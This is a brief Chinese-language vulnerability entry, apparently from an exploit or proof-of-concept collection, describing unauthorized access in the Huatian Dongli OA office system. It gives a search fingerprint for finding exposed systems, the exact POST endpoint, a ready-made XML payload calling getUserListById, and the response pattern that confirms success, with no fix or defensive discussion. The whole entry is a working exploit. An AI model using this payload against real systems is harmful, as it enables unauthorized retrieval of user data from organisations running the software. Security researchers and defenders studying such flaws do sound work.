# 华天动力OA办公系统存在未授权访问漏洞

华天动力OA办公系统 ｜ 未授权访问 ｜ —
- **指纹**：`"华天动力 OA"`
- **请求**：`POST /OAapp/bfapp/buffalo/hrApplicationFormService HTTP/1.1`

**Payload**
```
<buffalo-call>
<method>getUserListById</method>
<boolean>1</boolean>
<string></string>
<string>2</string>
<string></string>
<string></string>
<boolean>1</boolean>
<boolean>1</boolean>
</buffalo-call>
```
- **响应特征**：200 buffalo-reply